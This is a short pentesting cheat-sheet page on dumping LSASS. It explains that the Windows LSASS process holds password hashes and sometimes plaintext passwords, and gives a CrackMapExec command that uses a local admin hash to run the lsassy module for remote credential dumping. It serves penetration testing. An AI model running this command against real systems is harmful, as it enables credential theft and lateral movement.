# Dumping LSASS

<details>

<summary>What is LSASS ?</summary>

**L**ocal **S**ecurity **A**uthority **S**ubsystem **S**ervice (LSASS) is the process on Microsoft Windows that **handles all user authentication**, **password changes**, **creation of access tokens**, and **enforcement of security policies**.&#x20;

This means the **process stores multiple forms of hashed passwords**, and in some instances even stores plaintext user passwords.

</details>

```bash
cme smb $ip -u $local_admin -H $hash -M lsassy --local-auth
```

## More

{% embed url="https://pentestlab.blog/tag/lsass/" %}
